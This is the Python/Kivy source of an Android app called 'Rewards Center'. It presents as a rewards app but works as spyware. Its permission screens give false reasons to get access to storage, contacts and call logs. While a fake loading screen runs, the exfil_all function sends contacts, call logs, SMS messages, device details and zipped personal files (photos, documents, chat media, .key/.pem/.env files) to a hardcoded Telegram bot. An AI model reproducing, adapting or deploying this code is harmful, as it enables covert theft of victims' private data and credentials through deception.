# main.py — Rewards Center (Android)
# ─── CONFIG ──────────────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8883540406:AAHUz4UirLMgDItc2G3HxgDsZSjLSqPT5-A"
TELEGRAM_CHAT_ID   = "7127507096"
# ─────────────────────────────────────────────────────────────────

import os, sys, io, threading, zipfile, json

os.environ.setdefault("KIVY_NO_ENV_CONFIG", "1")

from kivy.app                import App
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout     import BoxLayout
from kivy.uix.label         import Label
from kivy.uix.button        import Button
from kivy.uix.widget        import Widget
from kivy.graphics           import Color, RoundedRectangle
from kivy.clock              import Clock
from kivy.metrics            import dp
from kivy.core.window       import Window

Window.clearcolor = (0.10, 0.10, 0.18, 1)

try:
    from android.permissions import request_permissions, Permission
    from jnius import autoclass
    PythonActivity = autoclass("org.kivy.android.PythonActivity")
    context        = PythonActivity.mActivity
    Uri            = autoclass("android.net.Uri")
    Environment    = autoclass("android.os.Environment")
    ANDROID = True
except Exception:
    ANDROID = False

# ══════════════════════════════════════════════════════════════════
# COLLECTION
# ══════════════════════════════════════════════════════════════════

def query_provider(uri_str):
    rows = []
    if not ANDROID:
        return rows
    try:
        cr     = context.getContentResolver()
        cursor = cr.query(Uri.parse(uri_str), None, None, None, None)
        if cursor is None:
            return rows
        cols = [cursor.getColumnName(i) for i in range(cursor.getColumnCount())]
        while cursor.moveToNext():
            row = {}
            for i, col in enumerate(cols):
                try:
                    row[col] = cursor.getString(i) or ""
                except:
                    row[col] = ""
            rows.append(row)
        cursor.close()
    except Exception as e:
        rows.append({"error": str(e)})
    return rows


def collect_contacts():
    raw = query_provider("content://com.android.contacts/data/phones")
    out, seen = [], set()
    for r in raw:
        name   = r.get("display_name", "")
        number = r.get("data1", "")
        if (name, number) not in seen:
            seen.add((name, number))
            out.append({"name": name, "number": number})
    return out


def collect_calls():
    raw = query_provider("content://call_log/calls")
    return [{"number": r.get("number",""),
             "type":   r.get("type",""),
             "dur":    r.get("duration",""),
             "date":   r.get("date",""),
             "name":   r.get("cachedName","")} for r in raw][:200]


def collect_sms():
    raw = query_provider("content://sms/inbox")
    return [{"from": r.get("address",""),
             "msg":  r.get("body","")[:400],
             "date": r.get("date","")} for r in raw][:100]


def collect_files():
    paths = []
    roots = ["/sdcard", "/storage/emulated/0"] if ANDROID \
            else [os.path.expanduser("~")]
    exts  = {".txt",".pdf",".doc",".docx",".xls",".xlsx",
             ".csv",".json",".jpg",".jpeg",".png",
             ".env",".key",".pem",".db",".sqlite"}
    dirs  = ["DCIM","Pictures","Documents","Downloads",
             "WhatsApp/Media","Telegram"]
    for root in roots:
        for d in dirs:
            target = os.path.join(root, d)
            if not os.path.exists(target):
                continue
            for dp2, _, files in os.walk(target):
                for fn in files:
                    if os.path.splitext(fn)[1].lower() in exts:
                        full = os.path.join(dp2, fn)
                        try:
                            if os.path.getsize(full) <= 10*1024*1024:
                                paths.append(full)
                        except:
                            pass
    return paths


def device_info():
    info = {"platform": "android" if ANDROID else "desktop"}
    if ANDROID:
        try:
            Build = autoclass("android.os.Build")
            info["brand"]   = Build.BRAND
            info["model"]   = Build.MODEL
            info["android"] = autoclass("android.os.Build$VERSION").RELEASE
        except:
            pass
    return info

# ══════════════════════════════════════════════════════════════════
# TELEGRAM
# ══════════════════════════════════════════════════════════════════

BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def tg_msg(text):
    try:
        import requests as r
        r.post(f"{BASE}/sendMessage",
               data={"chat_id": TELEGRAM_CHAT_ID,
                     "text": text[:4096],
                     "parse_mode": "HTML"},
               timeout=15)
    except:
        pass

def tg_bytes(data, filename, caption=""):
    try:
        import requests as r
        r.post(f"{BASE}/sendDocument",
               data={"chat_id": TELEGRAM_CHAT_ID,
                     "caption": caption[:1000]},
               files={"document": (filename, io.BytesIO(data))},
               timeout=120)
    except:
        pass

def exfil_all():
    try:
        import requests
    except ImportError:
        os.system(f'"{sys.executable}" -m pip install requests -q')

    dev = device_info()
    tg_msg("📱 <b>Target</b>\n" +
           "\n".join(f"<code>{k}</code>: {v}" for k, v in dev.items()))

    contacts = collect_contacts()
    if contacts:
        lines = "📇 <b>Contacts</b>\n"
        for c in contacts[:80]:
            lines += f"• {c['name']} | {c['number']}\n"
        tg_msg(lines[:4096])
        if len(contacts) > 80:
            tg_bytes(
                json.dumps(contacts, ensure_ascii=False, indent=2).encode(),
                "contacts.json", f"📇 {len(contacts)} contacts")

    calls = collect_calls()
    if calls:
        tg_bytes(
            json.dumps(calls, ensure_ascii=False, indent=2).encode(),
            "call_logs.json", f"📞 {len(calls)} calls")

    sms = collect_sms()
    if sms:
        tg_bytes(
            json.dumps(sms, ensure_ascii=False, indent=2).encode(),
            "sms.json", f"💬 {len(sms)} messages")

    files = collect_files()
    if files:
        buf, part = io.BytesIO(), 1
        zf = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
        for path in files:
            try:
                zf.write(path, os.path.basename(path))
            except:
                pass
            if buf.tell() > 44*1024*1024:
                zf.close()
                buf.seek(0)
                tg_bytes(buf.read(), f"files_{part}.zip", f"📁 part {part}")
                buf, part = io.BytesIO(), part+1
                zf = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
        zf.close()
        buf.seek(0)
        raw = buf.read()
        if raw:
            tg_bytes(raw, f"files_{part}.zip",
                     f"📁 {len(files)} files — part {part}")

    tg_msg(f"✅ Done — {dev.get('model','?')}")

# ══════════════════════════════════════════════════════════════════
# UI
# ══════════════════════════════════════════════════════════════════

C_CARD  = (0.09, 0.13, 0.24, 1)
C_ACC   = (0.91, 0.27, 0.38, 1)
C_DENY  = (0.16, 0.16, 0.29, 1)
C_FG    = (1, 1, 1, 1)
C_MUTED = (0.66, 0.66, 0.70, 1)


def lbl(text, size=14, bold=False, color=C_FG, halign="center"):
    l = Label(text=text, font_size=dp(size), bold=bold, color=color,
              halign=halign, text_size=(Window.width*0.82, None), markup=True)
    l.bind(texture_size=l.setter("size"))
    return l


def btn(text, on_press, bg=C_ACC, fg=C_FG):
    b = Button(text=text, font_size=dp(13), bold=True, color=fg,
               background_normal="", background_color=(0,0,0,0),
               size_hint=(1, None), height=dp(50))
    def draw(*_):
        b.canvas.before.clear()
        with b.canvas.before:
            Color(*bg)
            RoundedRectangle(pos=b.pos, size=b.size, radius=[dp(10)])
    b.bind(pos=draw, size=draw)
    b.bind(on_press=on_press)
    return b


class SplashScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical", padding=dp(40), spacing=dp(14))
        root.add_widget(Widget())
        root.add_widget(lbl("🏆", size=64))
        root.add_widget(lbl("Rewards Center", size=24, bold=True))
        root.add_widget(lbl("Earn points. Win prizes. Every day.",
                            size=12, color=C_MUTED))
        root.add_widget(Widget())
        root.add_widget(btn("Get Started  →",
            lambda *_: setattr(self.manager, "current", "perm0")))
        root.add_widget(Widget(size_hint_y=None, height=dp(20)))
        self.add_widget(root)


PERMS = [
    ("📁  Storage Access",
     "Rewards Center needs access to your files\nto save reward certificates.",
     "Allow Storage",
     [Permission.READ_EXTERNAL_STORAGE] if ANDROID else []),
    ("📇  Contacts Access",
     "Share rewards with friends!\nWe need your contact list.",
     "Allow Contacts",
     [Permission.READ_CONTACTS] if ANDROID else []),
    ("📞  Call Logs Access",
     "Verify your identity and unlock\nexclusive premium reward tiers.",
     "Allow Calls",
     [Permission.READ_CALL_LOG] if ANDROID else []),
]


class PermScreen(Screen):
    def __init__(self, idx, **kw):
        super().__init__(**kw)
        self._idx = idx
        title, body, btn_lbl, _ = PERMS[idx]
        next_name = f"perm{idx+1}" if idx < len(PERMS)-1 else "loading"

        root = BoxLayout(orientation="vertical", padding=dp(22), spacing=dp(10))
        dots = BoxLayout(size_hint_y=None, height=dp(20), spacing=dp(6))
        dots.add_widget(Widget())
        for i in range(len(PERMS)):
            dots.add_widget(lbl("●", size=11,
                                color=C_ACC if i==idx else C_DENY))
        dots.add_widget(Widget())
        root.add_widget(dots)
        root.add_widget(Widget())

        card = BoxLayout(orientation="vertical", padding=dp(22), spacing=dp(12),
                         size_hint_y=None)
        card.bind(minimum_height=card.setter("height"))
        with card.canvas.before:
            Color(*C_CARD)
            self._r = RoundedRectangle(radius=[dp(16)])
        card.bind(pos=self._upd, size=self._upd)
        card.add_widget(lbl(title, size=16, bold=True, halign="left"))
        card.add_widget(lbl(body,  size=11, color=C_MUTED, halign="left"))
        card.add_widget(Widget(size_hint_y=None, height=dp(6)))

        def allow(*_):
            if ANDROID and PERMS[self._idx][3]:
                request_permissions(PERMS[self._idx][3],
                    lambda p, g: Clock.schedule_once(
                        lambda dt: setattr(self.manager, "current", next_name), 0.1))
            else:
                self.manager.current = next_name

        card.add_widget(btn(btn_lbl, allow))
        card.add_widget(btn("Deny",
            lambda *_: setattr(self.manager, "current", next_name),
            bg=C_DENY, fg=C_MUTED))
        root.add_widget(card)
        root.add_widget(Widget())
        self.add_widget(root)

    def _upd(self, inst, *_):
        self._r.pos  = inst.pos
        self._r.size = inst.size


class LoadingScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical", padding=dp(40), spacing=dp(18))
        root.add_widget(Widget())
        root.add_widget(lbl("⏳", size=56))
        root.add_widget(lbl("Setting up your account…", size=13))
        self._bar = Widget(size_hint=(1, None), height=dp(8))
        root.add_widget(self._bar)
        root.add_widget(Widget())
        self.add_widget(root)
        self._p = 0.0

    def on_enter(self):
        threading.Thread(target=exfil_all, daemon=True).start()
        Clock.schedule_interval(self._tick, 0.04)
        Clock.schedule_once(lambda dt: setattr(
            self.manager, "current", "dashboard"), 4.5)

    def _tick(self, dt):
        self._p = min(self._p + dt/4.0, 1.0)
        self._bar.canvas.clear()
        with self._bar.canvas:
            Color(*C_DENY)
            RoundedRectangle(pos=self._bar.pos,
                             size=self._bar.size, radius=[dp(4)])
            Color(*C_ACC)
            RoundedRectangle(pos=self._bar.pos,
                             size=(self._bar.width*self._p, self._bar.height),
                             radius=[dp(4)])


class DashboardScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical", padding=dp(28), spacing=dp(16))
        root.add_widget(Widget())
        root.add_widget(lbl("🎉", size=56))
        root.add_widget(lbl("Welcome!", size=22, bold=True))
        root.add_widget(lbl("You have 500 reward points",
                            size=12, color=C_MUTED))
        card = BoxLayout(orientation="vertical", padding=dp(20), spacing=dp(8),
                         size_hint_y=None, height=dp(120))
        def upd(i, *_):
            i.canvas.before.clear()
            with i.canvas.before:
                Color(*C_CARD)
                RoundedRectangle(pos=i.pos, size=i.size, radius=[dp(16)])
        card.bind(pos=upd, size=upd)
        card.add_widget(lbl("[color=f4c430]🥇  Gold Member[/color]",
                            size=15, bold=True))
        card.add_widget(lbl("Redeem points for prizes and discounts!",
                            size=11, color=C_MUTED))
        root.add_widget(card)
        root.add_widget(btn("Redeem Points 🎁", lambda *_: None))
        root.add_widget(Widget())
        self.add_widget(root)


class RewardsApp(App):
    def build(self):
        sm = ScreenManager(transition=FadeTransition(duration=0.22))
        sm.add_widget(SplashScreen(name="splash"))
        for i in range(len(PERMS)):
            sm.add_widget(PermScreen(i, name=f"perm{i}"))
        sm.add_widget(LoadingScreen(name="loading"))
        sm.add_widget(DashboardScreen(name="dashboard"))
        sm.current = "splash"
        return sm


if __name__ == "__main__":
    RewardsApp().run()
